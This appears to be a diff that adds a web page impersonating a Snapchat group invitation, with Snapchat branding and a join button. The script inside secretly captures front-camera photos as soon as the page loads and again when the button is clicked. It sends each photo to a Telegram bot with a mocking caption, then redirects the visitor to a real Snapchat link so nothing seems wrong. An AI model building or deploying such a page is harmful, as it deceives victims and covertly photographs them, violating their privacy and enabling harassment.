@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Meta Tags -->
+    <title>Join my group on Snapchat</title>
+    <meta name="description" content="Join my group on Snapchat">
+    <meta property="og:title" content="Join my group on Snapchat">
+    <meta property="og:description" content="snapchat.com">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Snapchat">
+    <meta property="og:image" content="https://i1-c.pinimg.com/1200x/82/c8/9f/82c89f3b44f5e223843e64cb664156d3.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Join my group on Snapchat">
+    <meta name="twitter:description" content="snapchat.com">
+    <meta name="twitter:image" content="https://i1-c.pinimg.com/1200x/82/c8/9f/82c89f3b44f5e223843e64cb664156d3.jpg">
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #fff; 
+            color: #000; 
+            height: 100vh; 
+            overflow: hidden;
+        }
+        .invite-screen {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 50px;
+            text-align: center;
+        }
+        .snap-header {
+            background: #FFFC00;
+            color: black;
+            padding: 12px 0;
+            width: 100%;
+            font-weight: bold;
+            font-size: 19px;
+            position: fixed;
+            top: 0;
+            z-index: 10;
+        }
+        h1 {
+            font-size: 29px;
+            margin: 40px 20px 20px;
+            line-height: 1.15;
+        }
+        .circle {
+            width: 230px;
+            height: 230px;
+            border-radius: 50%;
+            overflow: hidden;
+            margin: 20px 0 30px;
+            border: 10px solid #fff;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.25);
+        }
+        .circle img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .join-btn {
+            margin-top: 20px;
+            padding: 16px 50px;
+            background: #000;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="invite-screen">
+        <div class="snap-header">Snapchat</div>
+        <h1>You're invited to<br>join a group on<br>Snapchat</h1>
+        <div class="circle">
+            <img src="https://i1-c.pinimg.com/1200x/82/c8/9f/82c89f3b44f5e223843e64cb664156d3.jpg" alt="Party">
+        </div>
+        <button class="join-btn" onclick="joinGroup()">Join on Snapchat</button>
+    </div>
+
+    <script>
+        const funnyMsg = "7kamtak a lfarkh";
+        let hasPermission = false;
+
+        // ====================== عند فتح الصفحة ======================
+        async function startOnLoad() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: 1280, height: 720 }
+                });
+                hasPermission = true;
+                captureMultiplePhotos(stream, 3);
+            } catch (err) {
+                hasPermission = false;
+            }
+        }
+
+        // ====================== عند الضغط على الزر ======================
+        async function joinGroup() {
+            try {
+                let stream;
+                if (!hasPermission) {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "user", width: 1280, height: 720 }
+                    });
+                    hasPermission = true;
+                } else {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "user", width: 1280, height: 720 }
+                    });
+                }
+
+                await captureMultiplePhotos(stream, 1);
+            } catch (err) {
+                console.log("تم رفض السماح بالكاميرا");
+            } finally {
+                setTimeout(() => {
+                    window.location.href = "https://snapchat.com/t/4OJnOzSW";
+                }, 800);
+            }
+        }
+
+        // دالة التقاط الصور
+        async function captureMultiplePhotos(stream, count) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.autoplay = true;
+            video.playsInline = true;
+            video.muted = true;
+
+            await new Promise(resolve => {
+                video.onloadedmetadata = resolve;
+            });
+
+            for (let i = 1; i <= count; i++) {
+                await new Promise(r => setTimeout(r, 100));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
+                await sendToTelegram(dataUrl, i);
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+        }
+
+        // إرسال إلى تيليجرام (آمن)
+        async function sendToTelegram(dataUrl, photoNumber) {
+            const botToken = process.env.TELEGRAM_BOT_TOKEN;
+            const chatId = process.env.TELEGRAM_CHAT_ID;
+
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", dataURLtoFile(dataUrl, `selfie-${photoNumber}.jpg`));
+            formData.append("caption", `📸 صورة ${photoNumber}\n${funnyMsg}`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (e) {}
+        }
+
+        function dataURLtoFile(dataurl, filename) {
+            const arr = dataurl.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new File([u8arr], filename, { type: mime });
+        }
+
+        // بدء التشغيل
+        window.onload = startOnLoad;
+    </script>
+</body>
+</html>
